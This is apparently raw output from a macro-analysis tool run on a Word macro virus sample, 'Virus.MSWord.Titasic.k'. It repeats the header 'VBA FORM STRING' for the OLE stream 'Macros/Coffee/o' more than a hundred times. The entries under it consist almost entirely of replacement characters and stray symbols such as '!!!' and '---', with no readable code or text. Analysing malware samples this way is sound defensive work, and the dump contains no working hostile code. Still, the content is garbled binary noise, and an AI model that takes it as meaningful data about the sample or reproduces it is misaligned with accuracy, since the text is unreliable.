- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!888������������������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ�������������������������������������������������������������---!!!!!!!!!---������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������������������������������������������������������������������������������������������---!!!!!!!!!!!!!!!888���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������---!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������������������������---!!!!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X---������������������������������������������������������������������������������������������������������������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������------���������������������������������������������������&&&
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������888!!!!!!!!!888���������������������������������������������������������888
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!888������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ꚛ�������������������������������������������������������222
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϝ��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!---������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ����������������������������������������������������$$$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xxx������������������������������������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������&&&
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xxx���������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ�������������������������������������������������������&&&
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ꚛ�������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������888$$$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!888������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������������222
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������&&&			
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ�������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɣ�����������������������������������������������������������"""
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!888������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g)))���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ꚛ����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������777
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϝ�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xxx������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p			$$$������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꌌ�!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϥ�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꜜ�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ�������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����$$$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������---!!!!!!!!!!!!---������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!!!!!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꮮ����������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p'''���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
σ��!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꥥ�������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ꩩ�---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!---���������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!---���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̟��   
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!!!!!!!!!!!!!!!!!!!---������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xxx���������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
888���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������---!!!!!!!!!!!!!!!!!!!!!!!!---������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ώ��---
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!!������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.k' - OLE stream: 'Macros/Coffee/o'
